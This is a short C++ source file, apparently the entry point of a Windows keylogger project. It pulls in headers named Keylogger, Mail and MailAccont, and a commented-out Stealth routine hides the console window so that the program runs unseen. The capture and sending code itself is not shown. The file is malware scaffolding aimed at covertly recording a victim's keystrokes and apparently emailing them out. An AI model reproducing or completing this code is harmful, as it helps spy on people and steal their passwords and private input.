#include <cstdlib>
#include <iostream>
#include "Mail.h"
#include "MailAccont.h"
#include "Application.h"
#include "Window.h"
#include "TimeLog.h"
#include "Keylogger.h"
#include "Log.h"
#include <windows.h>
using namespace std;

//void Stealth() {
//    HWND Stealth;
//    AllocConsole();
//    Stealth = FindWindowA("ConsoleWindowClass", NULL);
//    ShowWindow(Stealth, 0);
//}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
//C++ compiler opcja "-mwindows"
// cout << GetCommandLine(); == argv[0];
int main(int argc, char** argv) {
    //        Stealth();

//    if (strstr(argv[0], "keylogger.exe") > 0) {
        Application *app = new Application(argv[0]);
        app->start();
//    }
    
    return 0;
}

